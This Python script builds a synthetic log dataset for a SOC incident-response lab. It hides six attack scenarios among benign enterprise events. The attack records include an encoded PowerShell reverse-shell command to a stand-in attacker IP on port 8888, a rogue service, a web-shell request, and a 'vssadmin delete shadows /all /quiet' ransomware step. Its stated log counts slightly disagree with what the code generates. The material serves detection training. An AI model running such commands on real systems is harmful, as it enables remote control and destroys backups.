#!/usr/bin/env python3
"""
LOG360 Incident Response Lab - Advanced Attack & Noise Log Generator
Generates a realistic corporate log dataset (200+ logs) containing benign enterprise noise
mixed with 6 sophisticated cyber attack scenarios for SOC incident response training.
"""

import json
import os
import random
from datetime import datetime, timedelta

def generate_large_dataset(output_dir="./logs"):
    os.makedirs(output_dir, exist_ok=True)
    
    hosts = [
        "DC01.MEGACORP.LOCAL", "DC02.MEGACORP.LOCAL",
        "WKSTN-FIN01.MEGACORP.LOCAL", "WKSTN-HR02.MEGACORP.LOCAL", "WKSTN-DEV03.MEGACORP.LOCAL",
        "FILE-SRV01.MEGACORP.LOCAL", "EXCHANGE01.MEGACORP.LOCAL", "WEB-DMZ01"
    ]
    
    users = ["j.smith", "a.davis", "m.johnson", "r.taylor", "k.wilson", "b.clark", "s.miller", "Administrator", "SYSTEM"]
    legit_ips = ["192.168.1.10", "192.168.1.15", "192.168.1.42", "192.168.1.88", "192.168.1.100", "192.168.1.112"]
    
    logs = []
    base_time = datetime.now() - timedelta(hours=3)
    
    # 1. Generate 180+ Benign Background Enterprise Logs
    for i in range(180):
        t = (base_time + timedelta(seconds=i * 50 + random.randint(0, 30))).strftime("%Y-%m-%d %H:%M:%S")
        log_type = random.choice(["ADAudit_Plus", "Sysmon", "EventLog_Analyzer", "Web_Server_Log"])
        host = random.choice(hosts)
        user = random.choice(users)
        src_ip = random.choice(legit_ips)
        
        if log_type == "ADAudit_Plus":
            eid = random.choice([4624, 4634, 4672, 4769, 4768])
            sev = "INFO"
            msg = f"User {user} successfully authenticated via NTLM/Kerberos from {src_ip}."
        elif log_type == "Sysmon":
            eid = random.choice([1, 3, 5, 7, 10, 12, 13])
            sev = "INFO"
            proc = random.choice(["explorer.exe", "chrome.exe", "svchost.exe", "outlook.exe", "OneDrive.exe", "cmd.exe"])
            msg = f"Process {proc} initiated by {user}. Hash=SHA256={random.getrandbits(256):064x}"
        elif log_type == "EventLog_Analyzer":
            eid = random.choice([7036, 4624, 5140, 7040])
            sev = "INFO"
            msg = f"System service status change on {host}. Operation completed successfully."
        else:
            eid = random.choice([200, 304, 301, 404])
            sev = "INFO"
            uri = random.choice(["/index.html", "/about.php", "/contact.aspx", "/assets/logo.png", "/api/v1/health"])
            msg = f"HTTP GET {uri} {eid} OK - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
            
        logs.append({
            "timestamp": t,
            "log_type": log_type,
            "domain": "MEGACORP.LOCAL" if "DMZ" not in host else "DMZ",
            "event_id": eid,
            "severity": sev,
            "host": host,
            "source_ip": src_ip,
            "target_user": user,
            "message": msg
        })

    # 2. Inject Specific Attack Logs (Scenario Needles)
    
    # Task 1: Password Spraying & Lockout
    attack_time1 = base_time + timedelta(minutes=25)
    spray_users = ["j.smith", "a.davis", "m.johnson", "r.taylor", "k.wilson", "b.clark", "t.white", "c.harris"]
    for idx, u in enumerate(spray_users):
        logs.append({
            "timestamp": (attack_time1 + timedelta(seconds=idx * 12)).strftime("%Y-%m-%d %H:%M:%S"),
            "log_type": "ADAudit_Plus",
            "domain": "MEGACORP.LOCAL",
            "event_id": 4625,
            "severity": "HIGH",
            "host": "DC01.MEGACORP.LOCAL",
            "source_ip": "10.14.22.99",
            "target_user": u,
            "workstation": "ATTACKER-KALI",
            "status_code": "0xC000006D",
            "sub_status": "0xC000006A",
            "logon_type": 3,
            "message": f"User authentication failure via NTLM password spray targeting account {u}."
        })
    
    # Account Lockout Event
    logs.append({
        "timestamp": (attack_time1 + timedelta(seconds=110)).strftime("%Y-%m-%d %H:%M:%S"),
        "log_type": "ADAudit_Plus",
        "domain": "MEGACORP.LOCAL",
        "event_id": 4740,
        "severity": "CRITICAL",
        "host": "DC01.MEGACORP.LOCAL",
        "source_ip": "10.14.22.99",
        "target_user": "a.davis",
        "workstation": "ATTACKER-KALI",
        "status_code": "0x0",
        "sub_status": "0x0",
        "logon_type": 3,
        "message": "User account a.davis was locked out due to threshold violation."
    })

    # Task 2: Encoded PowerShell & Reverse Shell
    attack_time2 = base_time + timedelta(minutes=45)
    logs.append({
        "timestamp": attack_time2.strftime("%Y-%m-%d %H:%M:%S"),
        "log_type": "Sysmon",
        "domain": "MEGACORP.LOCAL",
        "event_id": 1,
        "severity": "CRITICAL",
        "host": "WKSTN-FIN01.MEGACORP.LOCAL",
        "source_ip": "10.14.22.99",
        "target_user": "m.johnson",
        "process_name": "powershell.exe",
        "command_line": "powershell.exe -nop -w hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQA0AC4AMgAyAC4AOQA5ACIALAA4ADgAOAA4ACkAA==",
        "parent_process": "excel.exe",
        "hashes": "SHA256=a3d89f112233445566778899aabbccddeeff00112233445566778899aabbccdd",
        "message": "Encoded PowerShell execution launched from malicious Excel macro creating socket to 10.14.22.99:8888."
    })
    logs.append({
        "timestamp": (attack_time2 + timedelta(seconds=4)).strftime("%Y-%m-%d %H:%M:%S"),
        "log_type": "Sysmon",
        "domain": "MEGACORP.LOCAL",
        "event_id": 3,
        "severity": "HIGH",
        "host": "WKSTN-FIN01.MEGACORP.LOCAL",
        "source_ip": "192.168.1.15",
        "destination_ip": "10.14.22.99",
        "destination_port": 8888,
        "target_user": "m.johnson",
        "process_name": "powershell.exe",
        "message": "Outbound TCP connection established from powershell.exe to C2 server 10.14.22.99 on port 8888."
    })

    # Task 3: Persistence Service
    attack_time3 = base_time + timedelta(minutes=65)
    logs.append({
        "timestamp": attack_time3.strftime("%Y-%m-%d %H:%M:%S"),
        "log_type": "EventLog_Analyzer",
        "domain": "MEGACORP.LOCAL",
        "event_id": 7045,
        "severity": "CRITICAL",
        "host": "WKSTN-FIN01.MEGACORP.LOCAL",
        "source_ip": "192.168.1.15",
        "target_user": "SYSTEM",
        "service_name": "WinHealthMonitorSvc",
        "service_file_name": "C:\\Users\\Public\\Libraries\\svc_host_patch.exe -daemon",
        "service_type": "user mode service",
        "start_type": "auto start",
        "message": "A new service WinHealthMonitorSvc was installed executing C:\\Users\\Public\\Libraries\\svc_host_patch.exe -daemon."
    })

    # Task 4: PsExec Lateral Movement
    attack_time4 = base_time + timedelta(minutes=90)
    logs.append({
        "timestamp": attack_time4.strftime("%Y-%m-%d %H:%M:%S"),
        "log_type": "ADAudit_Plus",
        "domain": "MEGACORP.LOCAL",
        "event_id": 4624,
        "severity": "HIGH",
        "host": "FILE-SRV01.MEGACORP.LOCAL",
        "source_ip": "192.168.1.15",
        "target_user": "Administrator",
        "workstation": "WKSTN-FIN01",
        "logon_type": 10,
        "logon_process": "User32",
        "message": "Successful RDP/Network Interactive logon (Logon Type 10) for user Administrator from WKSTN-FIN01."
    })
    logs.append({
        "timestamp": (attack_time4 + timedelta(seconds=25)).strftime("%Y-%m-%d %H:%M:%S"),
        "log_type": "Sysmon",
        "domain": "MEGACORP.LOCAL",
        "event_id": 1,
        "severity": "CRITICAL",
        "host": "FILE-SRV01.MEGACORP.LOCAL",
        "source_ip": "192.168.1.15",
        "target_user": "SYSTEM",
        "process_name": "PSEXESVC.exe",
        "command_line": "C:\\Windows\\PSEXESVC.exe",
        "parent_process": "services.exe",
        "hashes": "SHA256=b4c807d91a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d",
        "message": "PsExec remote execution service binary PSEXESVC.exe spawned under services.exe."
    })

    # Task 5: Web Shell Execution
    attack_time5 = base_time + timedelta(minutes=115)
    logs.append({
        "timestamp": attack_time5.strftime("%Y-%m-%d %H:%M:%S"),
        "log_type": "Web_Server_Log",
        "domain": "DMZ",
        "event_id": 200,
        "severity": "HIGH",
        "host": "WEB-DMZ01",
        "source_ip": "198.51.100.77",
        "http_method": "POST",
        "uri_path": "/assets/vendors/shell_v2.aspx",
        "status_code": 200,
        "user_agent": "Mozilla/5.0 (X11; Linux x86_64) Chopper-WebShell/4.1",
        "message": "HTTP POST request to /assets/vendors/shell_v2.aspx executed command payload returning 200 OK."
    })
    logs.append({
        "timestamp": (attack_time5 + timedelta(seconds=8)).strftime("%Y-%m-%d %H:%M:%S"),
        "log_type": "Sysmon",
        "domain": "DMZ",
        "event_id": 11,
        "severity": "CRITICAL",
        "host": "WEB-DMZ01",
        "source_ip": "198.51.100.77",
        "target_user": "cpool\\w3wp",
        "process_name": "w3wp.exe",
        "target_filename": "C:\\inetpub\\wwwroot\\assets\\vendors\\shell_v2.aspx",
        "message": "IIS Worker process w3wp.exe wrote new ASPX script shell_v2.aspx to web root."
    })

    # Task 6: Ransomware & Shadow Deletion
    attack_time6 = base_time + timedelta(minutes=140)
    logs.append({
        "timestamp": attack_time6.strftime("%Y-%m-%d %H:%M:%S"),
        "log_type": "Sysmon",
        "domain": "MEGACORP.LOCAL",
        "event_id": 1,
        "severity": "CRITICAL",
        "host": "FILE-SRV01.MEGACORP.LOCAL",
        "source_ip": "192.168.1.15",
        "target_user": "SYSTEM",
        "process_name": "vssadmin.exe",
        "command_line": "vssadmin.exe delete shadows /all /quiet",
        "parent_process": "lockbit_v3.exe",
        "hashes": "SHA256=8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a",
        "message": "Shadow copy destruction payload executed prior to volume encryption."
    })
    logs.append({
        "timestamp": (attack_time6 + timedelta(seconds=15)).strftime("%Y-%m-%d %H:%M:%S"),
        "log_type": "EventLog_Analyzer",
        "domain": "MEGACORP.LOCAL",
        "event_id": 5145,
        "severity": "CRITICAL",
        "host": "FILE-SRV01.MEGACORP.LOCAL",
        "source_ip": "192.168.1.15",
        "target_user": "Administrator",
        "share_name": "\\\\*\\C$\\PAYROLL_2026.LOCKBIT",
        "message": "Mass SMB network share modification detected on file server."
    })

    # Sort all logs by timestamp
    logs.sort(key=lambda x: x["timestamp"])
    
    # Save to JSON
    json_path = os.path.join(output_dir, "log360_events.json")
    with open(json_path, "w", encoding="utf-8") as f:
        json.dump(logs, f, indent=2)
        
    print(f"[+] Generated {len(logs)} realistic enterprise logs (180 noise + 14 attack logs) at {json_path}")

if __name__ == "__main__":
    out = os.environ.get("LOG_OUTPUT_DIR", "./logs")
    generate_large_dataset(out)
